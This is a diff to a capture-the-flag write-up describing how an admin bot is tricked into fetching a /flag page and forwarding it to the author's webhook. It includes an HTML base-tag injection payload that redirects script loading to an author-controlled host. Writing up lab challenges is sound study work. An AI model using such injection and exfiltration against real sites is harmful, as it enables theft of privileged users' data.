@@ -250,13 +250,15 @@ web:
     - "8080:8080"
 ```
 
-In docker, we can reference the ip of a container by using their container name. The admin bot visits `web:8080` as that is the configuration set in the `docker-compose.yml` file as shown above. So in this case, my script prompts a get request to `web:8080/flag` instead of the full url.
+In docker, we can reference the hostname of a container by using their container name. The admin bot visits `web:8080` as that is the configuration set in the `docker-compose.yml` file as shown above. So in this case, my script prompts a get request to `web:8080/flag` instead of the full url.
 
 After that the request is attached as a query parameter to the base url of my webhook site and the page was subsequently redirected to it.
 
 The github pages is available at [payload.jh123x.com](http://payload.jh123x.com/). It was time to inject my base and see the result on [webhook.site](https://webhook.site/).
 
-The payload that I used for the base injection is shown below and the github link upload is hosted at that url.
+The payload that I used for the base injection is shown below and the github link upload is hosted at that url. This payload was only injected into the lab field.
+
+This payload will work if you inject it into either of the fields
 
 ```html
 </title><base href="http://payload.jh123x.com/" />
